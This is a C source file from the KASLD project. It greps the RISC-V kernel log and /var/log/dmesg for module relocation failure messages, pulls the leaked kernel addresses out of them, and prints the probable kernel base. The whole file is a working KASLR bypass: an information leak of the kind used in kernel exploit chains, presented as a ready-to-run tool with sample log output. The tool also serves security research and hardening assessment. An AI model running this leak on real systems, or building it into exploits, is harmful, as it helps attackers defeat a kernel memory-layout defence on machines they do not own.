// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Search kernel log for RISC-V address relocation failures.
//
// From arch/riscv/kernel/module.c:
//
// "%s: target %016llx can not be addressed by the 32-bit offset from PC = %p\n"
// "%s: can not generate the GOT entry for symbol = %016llx from PC = %p\n"
//
// clang-format off
// $ dmesg | grep ffffe0
// [    0.000000]       lowmem : 0xffffffe000000000 - 0xffffffe07fe00000   (2046 MB)
// [   90.803776] nf_tables: target ffffffe0000dbc18 can not be addressed by the 32-bit offset from PC = 000000007c954634
// [   91.659399] nf_tables: target ffffffe0000dbc18 can not be addressed by the 32-bit offset from PC = 0000000022acd662
// [   92.516203] nf_tables: target ffffffe0000dbc18 can not be addressed by the 32-bit offset from PC = 0000000022acd662
// [   93.452368] nf_tables: target ffffffe0000dbc18 can not be addressed by the 32-bit offset from PC = 0000000022acd662
// [   97.393958] nf_tables: target ffffffe0000dbc18 can not be addressed by the 32-bit offset from PC = 00000000ca60ae01
// ...
// clang-format on
//
// # grep ffffffe0000dbc18 /proc/kallsyms
// ffffffe0000dbc18 t trace_initcall_finish_cb
// ffffffe0000dbc18 T _stext
// ffffffe0000dbc18 T _text
// ffffffe0000dbc18 D __init_end
// ffffffe0000dbc18 D __per_cpu_end
//
// Requires:
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
//   readable /var/log/dmesg.
//
// References:
// https://elixir.bootlin.com/linux/v6.7/source/arch/riscv/kernel/module.c
// https://github.com/riscv-non-isa/riscv-asm-manual/blob/master/riscv-asm.md#assembler-relocation-functions
// ---
// <bcoles@gmail.com>

#if !defined(__riscv) && !defined(__riscv__)
#error "Architecture is not supported"
#endif

#define _GNU_SOURCE
#include "include/kasld.h"
#include "include/syslog.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

unsigned long search_dmesg_riscv_relocation() {
  char *syslog;
  char *ptr;
  char *endptr;
  char *target_buf;
  const char *needle = ": target ";
  int size;
  unsigned long addr = 0;
  unsigned long leaked_addr = 0;

  printf("[.] searching dmesg for RISC-V address relocation failures ...\n");

  if (mmap_syslog(&syslog, &size))
    return 0;

  ptr = strtok(syslog, "\n");
  while ((ptr = strtok(NULL, "\n")) != NULL) {
    target_buf = strstr(ptr, needle);

    if (target_buf == NULL)
      continue;

    leaked_addr = strtoul(&target_buf[strlen(needle)], &endptr, 16);

    if (!leaked_addr)
      continue;

    if (leaked_addr >= KERNEL_BASE_MIN && leaked_addr <= KERNEL_BASE_MAX) {
      // printf("Found kernel pointer: %lx\n", leaked_addr);
      if (!addr || leaked_addr < addr)
        addr = leaked_addr;
    }
  }

  return addr;
}

unsigned long search_dmesg_log_file_riscv_relocation() {
  FILE *f;
  char *endptr;
  char *line = 0;
  size_t size = 0;
  char *target_buf;
  const char *path = "/var/log/dmesg";
  const char *needle = ": target ";
  unsigned long leaked_addr = 0;
  unsigned long addr = 0;

  printf("[.] searching %s for driver RISC-V address relocation failures ...\n",
         path);

  f = fopen(path, "rb");

  if (f == NULL) {
    perror("[-] fopen");
    return 0;
  }

  while ((getline(&line, &size, f)) != -1) {
    target_buf = strstr(line, needle);

    if (target_buf == NULL)
      continue;

    leaked_addr = strtoul(&target_buf[strlen(needle)], &endptr, 16);

    if (!leaked_addr)
      continue;

    if (leaked_addr >= KERNEL_BASE_MIN && leaked_addr <= KERNEL_BASE_MAX) {
      // printf("Found kernel pointer: %lx\n", leaked_addr);
      if (!addr || leaked_addr < addr)
        addr = leaked_addr;
    }
  }

  free(line);
  fclose(f);

  return addr;
}

int main() {
  unsigned long addr = search_dmesg_riscv_relocation();
  if (!addr)
    addr = search_dmesg_log_file_riscv_relocation();

  if (!addr)
    return 1;

  printf("lowest leaked address: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);
  return 0;
}
